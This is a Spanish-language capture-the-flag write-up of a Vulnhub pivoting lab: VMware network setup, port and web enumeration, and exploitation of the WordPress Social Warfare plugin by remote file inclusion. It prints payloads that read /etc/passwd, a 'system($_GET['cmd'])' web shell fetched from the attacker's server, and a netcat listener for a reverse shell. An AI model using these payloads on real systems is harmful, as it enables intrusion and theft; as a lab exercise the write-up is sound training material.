        [[Vulnhub]]
Martes 20 de junio del 2023 CDMX, Polanco.
Nota: En esta máquina hemos configurado una red interna VMnet3 para hacer un pivote hacia el DMV
Valente Spiegel

---
# Hablilidades.  [[Disiplinas.]]

### Wpwn "Linux Fácil"

Enumeración web  
Enumeración de WordPress  
Filtrado de sustitución desde BurpSuite para que la página de WordPress funcione correctamente  
Explotación del plugin de WordPress Social Warfare < 3.5.3 (RFI a RCE)  
EXTRA: Creación de un laboratorio similar utilizando Docker  
Reutilización de contraseñas (Pivoteo de usuarios)  
Abuso del grupo sudo [Escalada de privilegios]  
EXTRA: Creación de un script de bash para descubrir las computadoras en la red interna  
EXTRA: Creación de un script de bash para descubrir los puertos abiertos de las computadoras descubiertas en la red interna  
Jugando con SSH para aplicar reenvío de puertos locales.

### DMV "Linux Fácil"

Enumeración web  
Explotación de la utilidad web Youtube-dll (Inyección de comandos + SOCAT para saltar a la nueva subred) 
Explotación de PwnKit CVE-2021-4034 [Escalada de privilegios]

---
# Certificaciones.

eWPT  
eCPPTv2

---
# Preparación del Laboratorio en VMware (1/2).

### "Configuración de Adaptadores de red"

0.)La preparación del laboratorio de pivoting consiste en el objetivo de comprometer la seguridad de la máquina Wpwn. Una vez logrado, se utiliza como punto de pivote o trampolín para acceder a la máquina DMW. Este escenario simula una situación real de hacking, donde los atacantes intentan aprovechar una vulnerabilidad en un sistema para moverse y comprometer otros sistemas dentro de la red."

==Maquina victima 1 Wpwn.

![[Pasted image 20230620152724.png]]

==Maquina victima 2 DMW.

![[Pasted image 20230620152641.png]]

1.)  En el menú superior de VMware, encontramos opciones globales. Al seleccionar 'Edit', se despliega un menú que nos permite modificar las tarjetas de red virtuales.

![[Pasted image 20230620161351.png]]

2.)En este menú se muestran las interfaces de red disponibles. Si deseamos añadir otra interfaz, podemos hacerlo presionando el botón 'Change Settings', el cual nos otorgará los permisos necesarios para llevar a cabo dicha acción.

![[Pasted image 20230620153615.png]]

3.)Cuando seleccionamos 'Add Network', se despliega un menú que muestra las interfaces de red disponibles, cada una identificada con su respectivo nombre. Esta función nos permite agregar nuevas interfaces de red al sistema virtual para satisfacer las necesidades de conectividad de nuestras máquinas virtuales.

![[Pasted image 20230620153725.png]]

4.) En este caso crearemos la VMnet3 

![[Pasted image 20230620153844.png]]

5.)Se le asigna una IP fija que será 10.10.18.0 y podemos aplicar y aceptar.

![[Pasted image 20230620154037.png]]

6.)En las configuraciones de la máquina DMV, específicamente en la opción del adaptador de red (Network Adapter), seleccionamos una red personalizada (CUSTOM) para esta máquina. Elegimos la VMnet3 que acabamos de crear y luego reiniciamos la máquina. Esta configuración nos permite establecer una conexión de red específica para la máquina DMV, lo que facilita la comunicación y el intercambio de datos con otros sistemas en la red virtual.

![[Pasted image 20230620154246.png]]

7.)"En las configuraciones de la máquina Wpwn, particularmente en la opción del adaptador de red (Network Adapter), se selecciona una red de tipo NAT. Esto permite que la máquina Wpwn sea accesible desde la máquina atacante, ya que el modo de red NAT proporciona conectividad a través de una dirección IP virtual asignada a la máquina Wpwn. De esta manera, se establece un alcance de red entre la máquina atacante y la máquina Wpwn, permitiendo la comunicación y la realización de ataques desde la máquina atacante hacia la máquina Wpwn.

![[Pasted image 20230620154424.png]]

8.)La máquina Wpwn también contará con un segundo adaptador de red, el cual crearemos haciendo clic en el botón 'Add' y luego seleccionando 'New Network Adapter'. Esto nos permitirá añadir una nueva interfaz de red a la máquina Wpwn, brindándole más opciones de conectividad y configuración. Al agregar este segundo adaptador, podremos definir diferentes configuraciones de red para cada uno de los adaptadores presentes en la máquina Wpwn, lo que amplía las posibilidades de acceso y comunicación con otros sistemas en la red virtual.

![[Pasted image 20230620163009.png]]

9.)En esta etapa, configuramos el Network Adapter 2 de la máquina Wpwn para que se conecte a una red personalizada (CUSTOM) que está asociada a la VMnet3 previamente creada. Esta configuración nos permitirá realizar el salto desde la máquina Wpwn a otro sistema. Al establecer esta conexión, habilitamos la comunicación entre la máquina Wpwn y los sistemas conectados a la red VMnet3, lo que facilita el movimiento a través de la red y la realización de acciones posteriores en otros sistemas.

![[Pasted image 20230620154612.png]]

---
# Preparación del Laboratorio en VMware (2/2).
### "Configuración de GRUB"

0.) Para Wpwn "Después de reiniciar la máquina, podemos acceder a la configuración del GRUB presionando la tecla 'e'. Esto nos mostrará la configuración actual del GRUB, que modificaremos para poder acceder a una consola como usuario root y realizar cambios en las interfaces de red predeterminadas de la máquina. Para lograr esto, reescribiremos la tercera línea de abajo hacia arriba de la siguiente manera: 'rw init=/bin/bash'. Con esta modificación, podremos acceder a la consola con privilegios de root y realizar las modificaciones necesarias en las interfaces de red, incluyendo el cambio a la interfaz 'ens33' de VMware, por ejemplo.

init=/bin/bash

"rw" indica que el sistema de archivos raíz debe montarse en modo de lectura y escritura (read-write). Esto permite realizar cambios en los archivos del sistema, como reparar configuraciones incorrectas o recuperar datos.
"init=/bin/bash" especifica el programa que se utilizará como proceso de inicio en lugar del proceso init normal. En este caso, se utiliza el shell de bash (/bin/bash) como el proceso de inicio en lugar del programa init habitual. Bash es un intérprete de comandos que proporciona una interfaz de línea de comandos en el sistema operativo.

y salimos guardando cambios con (Ctrl + x)

=![[Pasted image 20230620155038.png]]

1.)El comando "ip a" nos permite ver las interfaces de red presentes en una máquina. En este caso, si ejecutamos ese comando, podemos observar que existen dos interfaces llamadas ens33 y ens35. Estas interfaces deben estar configuradas adecuadamente en el archivo de configuración de red y DHCP para asegurar su funcionamiento correcto.

El archivo de configuración de red es donde se especifican los parámetros de red de la máquina, como las direcciones IP, máscaras de red, puertas de enlace y configuraciones DNS. Es importante asegurarse de que las interfaces ens33 y ens35 estén representadas en este archivo, de modo que el sistema pueda asignarles la configuración adecuada.

Además, el archivo de configuración de DHCP también juega un papel importante en la configuración de las interfaces de red. DHCP (Protocolo de Configuración Dinámica de Hosts) permite que los dispositivos obtengan automáticamente una configuración de red, incluyendo la asignación de direcciones IP, máscaras de red y otros parámetros necesarios para la conectividad. Es necesario asegurarse de que las interfaces ens33 y ens35 estén correctamente definidas en el archivo de configuración de DHCP para que puedan recibir una configuración válida.

![[Pasted image 20230620155425.png]]

1.1) El comando "cd /etc/network && ls" nos permite navegar al directorio /etc/network y listar todos los archivos presentes en ese directorio. Al ejecutar este comando, encontramos un archivo llamado "interfaces", el cual contiene información relevante para la configuración de los protocolos de conexión y DHCP de la máquina.

El archivo "interfaces" es utilizado para definir y configurar las interfaces de red en sistemas basados en Debian, como Ubuntu. En este archivo, se especifican parámetros como direcciones IP, máscaras de red, puertas de enlace y configuraciones de DHCP. Es importante revisar y modificar este archivo según nuestras necesidades de red.

En el caso particular que mencionas, al examinar el archivo "interfaces", notas que no contiene la configuración para la interfaz de red ens35, que es generada por la VMnet3. Esto significa que esa interfaz no está siendo reconocida o configurada automáticamente por el sistema.

Para solucionar este problema, puedes agregar manualmente la configuración de la interfaz ens35 en el archivo "interfaces". Puedes seguir la estructura utilizada para las otras interfaces presentes en el archivo y definir los parámetros adecuados para la interfaz ens35, incluyendo la asignación de IP y configuración DHCP si es necesario.

Es importante destacar que la ubicación y el formato del archivo "interfaces" pueden variar según la distribución de Linux que estés utilizando. En algunas versiones más recientes, se utiliza el archivo "/etc/netplan/*.yaml" para la configuración de la red. Asegúrate de consultar la documentación correspondiente a tu distribución para obtener instrucciones precisas sobre cómo configurar las interfaces de red correctamente.

![[Pasted image 20230620155320.png]]

1.2) Para que la máquina funcione según tus necesidades, es necesario realizar modificaciones en el archivo "interfaces". Puedes utilizar el comando "nano" u otro editor de texto para abrir el archivo y agregar las siguientes líneas de código:

allow-hotplug ens35 iface ens35 inet dhcp

Estas líneas de código tienen un significado específico:

- "allow-hotplug ens35" indica que se permite que la interfaz de red ens35 se active automáticamente cuando se detecte un cable o dispositivo conectado a ella.
    
- "iface ens35 inet dhcp" especifica que la interfaz ens35 utilizará DHCP para obtener una configuración de red automáticamente. El protocolo DHCP asignará una dirección IP, máscara de red, puerta de enlace y otros parámetros necesarios para la conectividad de red.
    

Al añadir estas líneas de código al archivo "interfaces" y guardar los cambios, estás configurando la interfaz ens35 para que se active y obtenga una configuración de red a través de DHCP.

Recuerda que el comando "nano" es solo un ejemplo de editor de texto que puedes utilizar. Si prefieres usar otro editor, como vim o gedit, puedes reemplazar "nano" por el nombre del editor que desees utilizar.

Una vez que hayas realizado los cambios en el archivo "interfaces" y hayas guardado los cambios, puedes reiniciar la máquina o reiniciar los servicios de red para que los cambios surtan efecto. De esta manera, la interfaz ens35 debería obtener una configuración de red a través de DHCP y funcionar según lo esperado.

![[Pasted image 20230620155729.png]]

2.0)En DMV  "Después de reiniciar la máquina, podemos acceder a la configuración del GRUB presionando la tecla 'e'. Esto nos mostrará la configuración actual del GRUB, que modificaremos para poder acceder a una consola como usuario root y realizar cambios en las interfaces de red predeterminadas de la máquina. Para lograr esto, reescribiremos la tercera línea de abajo hacia arriba de la siguiente manera: 'rw init=/bin/bash'. Con esta modificación, podremos acceder a la consola con privilegios de root y realizar las modificaciones necesarias en las interfaces de red, incluyendo el cambio a la interfaz 'ens33' de VMware, por ejemplo.

init=/bin/bash

"rw" indica que el sistema de archivos raíz debe montarse en modo de lectura y escritura (read-write). Esto permite realizar cambios en los archivos del sistema, como reparar configuraciones incorrectas o recuperar datos.
"init=/bin/bash" especifica el programa que se utilizará como proceso de inicio en lugar del proceso init normal. En este caso, se utiliza el shell de bash (/bin/bash) como el proceso de inicio en lugar del programa init habitual. Bash es un intérprete de comandos que proporciona una interfaz de línea de comandos en el sistema operativo.

y salimos guardando cambios con (Ctrl + x)


![[Captura de pantalla 2023-06-20 160327.png]]

3.0.)En el caso de DMV, el archivo de configuración que se necesita editar se encuentra en la ubicación /etc/netplan/ y se llama "50-cloud-init.yaml". Este archivo contiene la configuración de red para la máquina.

En DMV, solo tienes una interfaz de red inalámbrica generada por VMnet3. Sin embargo, se debe asignar esta interfaz a la interfaz ens33 para que funcione correctamente.

Para realizar esta asignación, abre el archivo "50-cloud-init.yaml" utilizando un editor de texto como "nano" o cualquier otro de tu preferencia. Dentro del archivo, busca la sección que define la configuración de la interfaz de red y realiza los cambios.

![[Pasted image 20230620160817.png]]


5.0)Después de aplicar los cambios y haber reiniciado la máquina, tendrás el laboratorio completamente configurado y listo para usar. Ahora podrás aprovechar todas las funcionalidades y características del entorno de laboratorio montado

![[Pasted image 20230620161013.png]]

---

# Fase de descubrimiento y enumeración. (1/2)


El objetivo principal de la fase de descubrimiento es obtener una visión general de la red objetivo. Se busca identificar los dispositivos activos, como servidores, routers, y otros equipos de red, así como los servicios y aplicaciones que se ejecutan en ellos. Esto se logra mediante el uso de herramientas de escaneo de red.

```
Sudo arp-scan ens33 

El comando "sudo arp-scan ens33" se utiliza para realizar un escaneo ARP en la interfaz de red "ens33" con privilegios de superusuario. El escaneo ARP (Protocolo de Resolución de Direcciones) permite obtener información sobre los dispositivos activos en una red local. Al ejecutar este comando, se enviarán solicitudes ARP a todas las direcciones IP de la red para obtener las direcciones MAC correspondientes a cada una.

Sudo netdiscover

El comando "sudo netdiscover" también se utiliza para realizar un escaneo de red en busca de dispositivos activos. Al ejecutarlo con privilegios de superusuario, netdiscover enviará paquetes de sondeo a la red local y mostrará información sobre los hosts activos, como direcciones IP y direcciones MAC.

Ping -c 1 192.168.153.28

El comando "ping -c 1 192.168.153.28" se utiliza para enviar un solo paquete de ping a la dirección IP especificada (en este caso, 192.168.153.28). El ping es una utilidad de red que se utiliza para verificar la conectividad entre dos dispositivos. Al enviar un paquete de ping a una dirección IP, se espera recibir una respuesta si el host está activo y accesible en la red. El parámetro "-c 1" indica que se enviará solo un paquete de ping.
```

![[Captura de pantalla 2023-06-22 122538.png]]
En general, una traza con un TTL (Time To Live) de 64 no proporciona información directa sobre el sistema operativo de la máquina destino. El TTL se utiliza para limitar la vida útil de un paquete de red en la red y evitar que circule infinitamente. Cada salto en la ruta del paquete decrementa el valor del TTL en 1. Si el TTL llega a cero, el paquete se descarta y se envía una notificación de "Time Exceeded" (Tiempo Excedido) al remitente.

Sin embargo, a menudo se asocia un valor de TTL de 64 con sistemas operativos basados en Linux debido a la configuración predeterminada de la pila de red de Linux. Los sistemas operativos Linux suelen establecer el valor inicial del TTL en 64 para los paquetes salientes. Sin embargo, esto no es exclusivo de los sistemas Linux, ya que otros sistemas operativos también pueden utilizar valores de TTL similares.

---

# Creación de directorios oh espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.

Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

WpnwyDMV
{Scan,Content,Exploits,Evidencia}

```
Mkdir WpnwyDMV && cd WpnwyDMV
Mkdir {Scan,Contenta,Exploits} && ls && Scan
```

![[Captura de pantalla 2023-06-22 123231.png]]

---

# Fase de descubrimiento y enumeración. (2/2)

==Escaneo de puertos:

Se realiza un escaneo más detallado de los puertos abiertos identificados durante la fase de descubrimiento. Esto implica el uso de herramientas como Nmap para obtener información sobre los servicios y versiones específicas que se ejecutan en cada puerto.

```
Sudo nmap -p- --open -sS --min-rate 5000 -vvv - n - Pn 192.168.153.128

El comando "sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.128" es una forma de utilizar la herramienta de escaneo de red Nmap con una serie de opciones y argumentos específicos. Aquí está el significado de cada opción utilizada en el comando:

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `-p-`: Escanea todos los puertos, desde el puerto 1 hasta el puerto 65535. Esto permite una exploración exhaustiva de todos los puertos abiertos en el objetivo.

- `--open`: Muestra solo los puertos que están abiertos y disponibles para conexiones.

- `-sS`: Realiza un escaneo TCP SYN. Envia un paquete SYN al puerto de destino y espera una respuesta SYN-ACK. Este tipo de escaneo se utiliza para determinar qué puertos están abiertos.

- `--min-rate 5000`: Establece la tasa mínima de paquetes enviados por segundo a 5000. Esto controla la velocidad del escaneo, asegurando que se envíen suficientes paquetes para obtener resultados precisos.

- `-vvv`: Establece el nivel de verbosidad a "muy, muy, muy" alto, lo que proporciona una salida detallada y exhaustiva durante el escaneo.

- `-n`: Desactiva la resolución de nombres de hosts para acelerar el escaneo y evitar consultas DNS.

- `-Pn`: Suprime la detección de hosts y trata todas las direcciones IP especificadas como hosts activos. Esto puede ser útil si se desea escanear un objetivo incluso si no hay respuesta a los pings.

- `192.168.153.128`: Es la dirección IP del objetivo que se va a escanear.

```

![[Captura de pantalla 2023-06-22 123721.png]]

==Enumeración de servicios:

Una vez identificados los puertos abiertos, se realiza una enumeración exhaustiva de los servicios encontrados. Esto incluye la obtención de información detallada sobre las aplicaciones, protocolos, configuraciones y cualquier dato relevante que pueda ayudar a identificar debilidades o vulnerabilidades.

```
Sudo nmap -sCV -p22,80 192.169.153.128 -oN targeted

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `-sCV`: Realiza un escaneo combinado, utilizando los scripts de detección de versiones y los scripts de enumeración de servicios predeterminados de Nmap. Esta opción ayuda a identificar los servicios y sus versiones en los puertos abiertos.

- `-p22,80`: Especifica los puertos a escanear. En este caso, el escaneo se realiza en los puertos 22 (SSH) y 80 (HTTP).

- `192.169.153.128`: Es la dirección IP del objetivo que se va a escanear.

- `-oN targeted`: Guarda la salida del escaneo en un archivo llamado "targeted". La opción `-oN` se utiliza para especificar el formato de salida como normal (texto plano).

```

![[Captura de pantalla 2023-06-22 124116.png]]

```
22/tcp open ssh OpenSSH 7.9

El puerto 22/tcp es el puerto predeterminado utilizado por el protocolo SSH (Secure Shell) para la comunicación segura entre un cliente y un servidor. SSH es un protocolo de red utilizado para el acceso remoto a sistemas y dispositivos, así como para el transporte seguro de datos.

Cuando el puerto 22/tcp está abierto y se detecta que SSH está en ejecución en ese puerto, significa que el servidor está escuchando conexiones entrantes y acepta conexiones SSH. Esto puede tener implicaciones importantes en términos de ciberseguridad. A continuación, se mencionan algunos aspectos relevantes a considerar:

1. Acceso remoto seguro: La apertura del puerto 22/tcp indica que se permite el acceso remoto al sistema o dispositivo a través del protocolo SSH. Esto puede ser beneficioso para administrar servidores de forma remota de manera segura, ya que SSH utiliza técnicas criptográficas para proteger la comunicación.

2. Autenticación segura: SSH ofrece opciones de autenticación segura, como el uso de claves públicas y privadas, lo que proporciona una mayor seguridad en comparación con otros protocolos de acceso remoto más antiguos, como Telnet.
   
3. Posible objetivo para ataques: El puerto 22/tcp abierto también puede ser un objetivo para los atacantes, ya que los servidores SSH pueden ser vulnerables a intentos de fuerza bruta, intentos de autenticación y ataques de diccionario. Es importante mantener actualizados los sistemas SSH, aplicar políticas de contraseñas fuertes y utilizar medidas de seguridad adicionales, como bloqueo de direcciones IP o autenticación multifactor, para proteger contra posibles ataques.
   
4. Auditoría y registro: Al tener el puerto 22/tcp abierto y el servicio SSH en ejecución, es importante llevar a cabo una auditoría y registro adecuados de las actividades de acceso y las conexiones SSH realizadas. Esto permite el monitoreo y la detección de comportamientos anómalos o intentos de acceso no autorizados.
```

```
80/tcp open http Apachehttpd 3.4.38

El puerto 80/tcp es el puerto predeterminado utilizado por el protocolo HTTP (Hypertext Transfer Protocol) para la comunicación entre clientes y servidores web. Cuando el puerto 80/tcp está abierto y se detecta el servicio HTTP en ejecución, indica que el servidor está escuchando conexiones entrantes y puede servir páginas web a través de este protocolo.

1. Servicio web: La apertura del puerto 80/tcp y el funcionamiento de Apache HTTP (versión 2.4.3) indican que el servidor está configurado para servir páginas web a través del protocolo HTTP. Esto puede ser un objetivo potencial para los atacantes, ya que los servidores web son puntos de entrada comunes para ataques y explotaciones.

2. Configuración segura: Es fundamental configurar el servidor web de manera segura. Esto implica aplicar directivas y configuraciones adecuadas para evitar ataques como inyecciones de código, desbordamientos de búfer, ataques de fuerza bruta y otros vectores de ataque comunes dirigidos a servidores web.

3. Seguridad del contenido: Además de la seguridad del servidor web en sí, también es importante considerar la seguridad del contenido que se sirve a través del puerto 80/tcp. Esto incluye el manejo adecuado de datos sensibles, la protección contra ataques de inyección SQL, la mitigación de ataques de denegación de servicio y la implementación de mecanismos de autenticación y autorización sólidos.
```

---

# Escaneo web.

==Como sabemos que la maquina esta desplegando un servicio http desde el puerto 80, esta es nuestra principal puerta de entrada.

WhatWeb es una herramienta de reconocimiento web que se utiliza para identificar tecnologías y características específicas de un sitio web. Realiza una exploración automatizada de un objetivo y extrae información relevante sobre la plataforma de alojamiento, el software del servidor web, los marcos de aplicaciones, los sistemas de gestión de contenido (CMS), los scripts y otras tecnologías utilizadas en el sitio.

```
Whatweb 192.168.153.128
```

![[Captura de pantalla 2023-06-22 124301.png]]

![[Captura de pantalla 2023-06-22 125418.png]]

==Sorbe la pagina web desplegada solo ay información adicional del creador. "nada importante. Esto nos da hincapié a realisar un escaneo de directorios cun ayuda de un diccionario y nmap"


```
Sudo nmap --script http-enum -p80 192.168.153.128 -oN webScan

Este comando utiliza Nmap con el script "http-enum" para realizar un escaneo específico en el puerto 80 de la dirección IP de destino. El script "http-enum" se encarga de enumerar y obtener información adicional sobre los servicios HTTP

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `--script http-enum`: Especifica el script de Nmap que se utilizará, en este caso, "http-enum". Este script se utiliza para enumerar y obtener información adicional sobre los servicios HTTP en el objetivo.

- `-p80`: Especifica el puerto a escanear. En este caso, el escaneo se realiza en el puerto 80, que es el puerto predeterminado utilizado por el protocolo HTTP.

- `192.168.153.128`: Es la dirección IP del objetivo que se va a escanear.

- `-oN webScan`: Guarda la salida del escaneo en un archivo llamado "webScan". La opción `-oN` se utiliza para especificar el formato de salida como normal (texto plano).

```

![[Captura de pantalla 2023-06-22 124538.png]]

==El resultado de el escaneo fue exitoso mostrando 2 directorios de la pagina web 

http://192.168.153.128/WordPress
http://192.168.153.128/robots.txt

```
Whatweb 192.168.153.128/WordPress
Curl http://192.168.153.128/robots.txt
```

![[Captura de pantalla 2023-06-22 125136.png]]

==La extracción del contenido con el curl a  http://192.168.153.128/robots.txt nos da una pista falsa del creador.

![[Captura de pantalla 2023-06-22 125531.png]]

==La primera vez que visitamos la pagina web nos presenta un error de carga.

![[Captura de pantalla 2023-06-22 125607.png]]

==El cual es mas fácil de ver desde el codigo fuente, vemos que se esta intentando conectar una IP desconocida ya que la nuestra es la 192.168.153.128 

![[Captura de pantalla 2023-06-22 125710.png]]

![[Captura de pantalla 2023-06-22 134016.png]]

En este caso, puedes configurar Burp Suite para interceptar las solicitudes y respuestas entre tu navegador web y el servidor. Luego, puedes agregar una regla en Burp Suite para modificar el cuerpo (body) de la página web en función de la IP desconocida encontrada en el código fuente.

![[Captura de pantalla 2023-06-22 134104.png]]

![[Captura de pantalla 2023-06-22 134252.png]]

La regla que se propone en este contexto consiste en buscar la IP desconocida en el cuerpo de la página y reemplazarla por la IP deseada. Esto se puede hacer utilizando las funcionalidades de búsqueda y reemplazo de Burp Suite.

Al añadir esta regla, cuando se cargue la página web en el navegador, Burp Suite interceptará la solicitud y realizará el reemplazo de la IP desconocida por la IP especificada. De esta manera, la página web cargada en el navegador contendrá la IP deseada en lugar de la IP desconocida.

==Con esto solucionamos ése erro de conexion.

![[Captura de pantalla 2023-06-22 134513.png]]

==Antes de un ataque dirigido o programado se intentan las credenciales mas comunes y se logra aprecia que el usuario admin esta registro pero aun no sabemos su contraseña.

![[Captura de pantalla 2023-06-22 134742.png]]

---

# Wordpress

WordPress es un sistema de gestión de contenidos (CMS) muy popular que permite crear y administrar sitios web de manera sencilla y eficiente. En términos de ciberseguridad, existen varios aspectos importantes a considerar en relación a WordPress:

1. Actualizaciones: Mantener WordPress, sus plugins y temas actualizados es crucial para garantizar la seguridad. Las actualizaciones suelen incluir correcciones de vulnerabilidades conocidas y mejoras de seguridad.

2. Contraseñas seguras: Es fundamental utilizar contraseñas robustas y únicas tanto para la cuenta de administrador de WordPress como para los usuarios del sitio. Esto ayuda a prevenir el acceso no autorizado.
  
3. Plugins y temas confiables: Al elegir y utilizar plugins y temas, es recomendable utilizar fuentes confiables, como el repositorio oficial de WordPress. Los plugins y temas de fuentes no verificadas pueden contener vulnerabilidades de seguridad.
   
4. Protección contra ataques de fuerza bruta: Los ataques de fuerza bruta son comunes en WordPress, donde los atacantes intentan adivinar las credenciales de inicio de sesión mediante el uso de combinaciones de contraseñas. Utilizar complementos de seguridad o ajustar la configuración del servidor para limitar los intentos de inicio de sesión puede ayudar a prevenir estos ataques.
   
5. Configuración segura de archivos: Asegurarse de que los archivos de configuración de WordPress (como wp-config.php) estén correctamente protegidos y no sean accesibles públicamente. Esto evita la exposición de información sensible y posibles ataques.
   
6. Copias de seguridad regulares: Realizar copias de seguridad periódicas de la base de datos y los archivos del sitio web es esencial para protegerse contra la pérdida de datos y para poder restaurar el sitio en caso de un incidente de seguridad.
   
7. Auditoría y monitoreo: Implementar herramientas de auditoría y monitoreo puede ayudar a detectar actividades sospechosas, como intentos de inicio de sesión fallidos o cambios no autorizados en el sitio web.
   
8. Protección contra ataques de inyección: WordPress es propenso a ataques de inyección, como inyección SQL o inyección de código. Validar y filtrar los datos de entrada, así como utilizar consultas preparadas y funciones de escape, puede ayudar a mitigar estos riesgos.
   
9. Seguridad en capas: Además de las medidas específicas de WordPress, es importante tener una estrategia de seguridad en capas que incluya firewall de aplicaciones web (WAF), seguridad a nivel de servidor, monitoreo de red y otras medidas de seguridad complementarias.
  
10. Comunidad y recursos: La comunidad de WordPress es amplia y activa, lo que significa que hay una gran cantidad de recursos y documentación disponibles para ayudar a abordar los aspectos de seguridad de WordPress. Participar en la comunidad y mantenerse informado sobre las mejores prácticas de seguridad es fundamental.

==Nuestro primer verctor de ataque sera buscar los plugins y verificar si son vulnerables.

![[Captura de pantalla 2023-06-22 135241.png]]

```
Curl -s -X "http://192.168.153.129/wordpress/" --proxy http://127.0.0.1:8000 | grep plugin 

Este comando utiliza cURL para realizar una solicitud GET a la URL [http://192.168.153.129/wordpress/](http://192.168.153.129/wordpress/)" a través de un proxy en "127.0.0.1:8000". Luego, se utiliza el comando "grep" para buscar y mostrar las líneas que contienen la palabra "plugin" en la salida de la solicitud. Esto puede ser útil para identificar plugins instalados o menciones de plugins en el contenido de la página web.

- `curl`: El comando en sí para ejecutar cURL, una herramienta de línea de comandos utilizada para realizar solicitudes HTTP.

- `-s`: Esta opción se utiliza para realizar una solicitud en modo silencioso, lo que significa que no se mostrarán detalles o mensajes de progreso durante la ejecución del comando.

- `-X "http://192.168.153.129/wordpress/"`: Esta opción se utiliza para especificar el método HTTP a utilizar en la solicitud. En este caso, se usa el método GET para obtener el contenido de la URL proporcionada.

- `--proxy http://127.0.0.1:8000`: Esta opción se utiliza para especificar un proxy a través del cual se realizará la solicitud. En este caso, se utiliza el proxy HTTP en "127.0.0.1:8000".

- `| grep plugin`: El símbolo "|" se utiliza para redirigir la salida de cURL al comando "grep". El comando "grep" se utiliza para buscar y filtrar líneas que contengan la palabra "plugin" en la salida de cURL.

```

==Plugin Social Warfare 

---

# Social Warfare "Vulnerable code injection PHP"

La vulnerabilidad en cuestión permitía a un atacante ejecutar código malicioso de forma remota en los sitios web que tenían instalada la extensión Social Warfare en su versión 3.5.2 o anterior. Esto se debía a un problema de seguridad en la forma en que la extensión procesaba las solicitudes de compartir contenido en redes sociales.

La explotación exitosa de esta vulnerabilidad podía permitir que un atacante inyectara y ejecutara código PHP arbitrario en el sitio web comprometido. Esto podría conducir a diversas consecuencias negativas, como la modificación o eliminación de archivos, el robo de información confidencial o el control total del sitio web por parte del atacante.

==Para desarrollar este ataque necesitamos levantar un servicio http.server de manera local el cual contenga el siguiente código el cual será creado con nano y guardado como un .txt.

Ejecutar comandos del sistema de esta manera en un entorno web puede ser peligroso desde una perspectiva de seguridad. Permite la ejecución de comandos arbitrarios en el servidor, lo que podría ser aprovechado por atacantes para obtener acceso no autorizado, robar información confidencial o causar daños al sistema.

```
<Pre>system('cat /ect/passwd')</pre>

El comando en cuestión es "cat /etc/passwd", que es un comando de Unix/Linux utilizado para mostrar el contenido del archivo "/etc/passwd". Este archivo almacena información sobre las cuentas de usuario en el sistema operativo.

```

==Este tendrá el nombre de comando 1 y tendrá que esta ubicado en la raíz del directorio compartido.

![[Captura de pantalla 2023-06-22 141611.png]]

Al ejecutar este comando, iniciarás un servidor web simple en tu máquina en el puerto 80, lo que te permitirá servir archivos y contenido web localmente.
```
Sudo python3 -m http.server 80

- "sudo": Es un comando utilizado en sistemas basados en Unix/Linux que permite ejecutar el comando con privilegios de superusuario. Proporciona los permisos necesarios para iniciar el servidor en un puerto privilegiado como el puerto 80.

- "python3": Es el intérprete de Python en su versión 3.

- "-m http.server": Es una opción del intérprete de Python que ejecuta el módulo "http.server", el cual proporciona un servidor web simple.

- "80": Es el número de puerto en el que se inicia el servidor. El puerto 80 es el puerto estándar utilizado para las solicitudes HTTP.
```

![[Captura de pantalla 2023-06-22 141132.png]]

```
http://102.168.153.128/wordpress/wp-admin/admin-post.php?wsp_debug=load_options&swp_url=http://192.168.153.129/comando1.txt

- `http://102.168.153.128/wordpress/wp-admin/admin-post.php` es la URL a la que se realiza la solicitud. Parece ser una ruta dentro de un sitio de WordPress, específicamente la ruta `admin-post.php` en el directorio `wp-admin`.

- `?` indica el inicio de los parámetros de la URL.

- `wsp_debug=load_options` es un parámetro que indica que se desea cargar opciones de depuración.

- `&` se utiliza para separar múltiples parámetros en la URL.

- `swp_url=http://192.168.153.129/comando1.txt` es otro parámetro que especifica una URL (`http://192.168.153.129/comando1.txt`) a la que se está haciendo referencia.
```


![[Captura de pantalla 2023-06-22 141906.png]]

==Si logramos ver el archivo de texto  /etc/passdw la vulnerabilidad acontecio con exito y tenemos la ejecucion de comandos.

```
<Pre>system('hostname -I')</pre>
```

==Si modificamos el comando y como prueba de nuestro laboratorio de pivoting en esta maquina debemos de tener 2 interfaces de red una que se cominica directamente con nosotros y otra que apunta a la maquina DMV.


![[Captura de pantalla 2023-06-22 142125.png]]

==192.168.153.128 y 10.10.18.128

---

# Reverse Shells

HTTP Reverse Shell: En este caso, el objetivo comprometido establece una conexión HTTP con el atacante. El objetivo realiza una solicitud HTTP hacia una dirección específica donde el atacante está escuchando. El atacante procesa la solicitud y ejecuta comandos en el objetivo a través de la comunicación HTTP.

```
<Pre>system($_GET['cmd'])</pre>

esta línea de código permite ejecutar un comando del sistema en el servidor web utilizando el valor proporcionado a través del parámetro `cmd` en una solicitud GET. Sin embargo, es importante destacar que este código puede ser peligroso si no se realiza una validación y filtrado adecuados de los valores de entrada. Si el parámetro `cmd` se puede manipular por un usuario malintencionado, podría permitir la ejecución de comandos arbitrarios en el servidor, lo que podría llevar a vulnerabilidades de seguridad y comprometer el sistema.

- `<pre>` y `</pre>`: Son etiquetas de HTML utilizadas para definir un bloque de texto preformateado.

- `system()`: Es una función en PHP que permite ejecutar comandos del sistema operativo.

- `$_GET['cmd']`: Es una superglobal en PHP que recupera los valores de los parámetros pasados a través de una solicitud GET. En este caso, se espera que el parámetro `cmd` contenga el comando del sistema a ejecutar.
 
```

==Se levanta el código.

![[Captura de pantalla 2023-06-22 142548.png]]

==Para recibir la Reverse Shell debemos ponernos en escucha.,La shell inversa permite a un atacante tomar el control de un sistema remoto. Esto plantea serios problemas de seguridad y es una práctica altamente riesgosa.

```
sudo nc -nlvp 443

